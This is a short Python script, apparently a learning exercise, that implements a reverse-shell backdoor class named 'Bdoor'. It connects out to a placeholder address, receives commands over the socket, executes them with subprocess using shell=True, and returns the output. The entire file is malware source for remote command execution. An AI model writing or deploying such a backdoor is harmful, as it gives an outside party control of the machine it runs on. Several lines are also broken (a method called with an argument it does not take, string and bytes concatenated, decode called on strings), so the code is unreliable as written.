#!/usr/bin/python
# General - Using json to manage serialisation to send large data.
# General - It's able to connect and, receive and send data.


import socket, json
import subprocess

class Bdoor:
    def __init__(self, addr, prt):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((addr, prt))

    def send_data(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:  
                json_data = self.conn.recv(1024)
                if json_data.decode() == "":
                    continue
                print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data.decode()) #testing
                print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
                return json.loads(json_data)
            except ValueError:
                continue
                
    def execute_sys_cmd(self, comm):
        return subprocess.check_output(comm, shell=True)

    def run(self):
        while True:
            comm = self.rcve_data(1024)
            print("\ncomm:\n\t" + comm + "\n") #testing
            comm_result = self.execute_sys_cmd(comm.decode())
            print("\ncomm result:\n\t" + comm_result + "\n") #testing
            self.send_data(comm_result)
            if "exit" in comm.decode():
                self.conn.close()
                break

my_bd = Bdoor("<ip>", <prt>)
my_bd.run()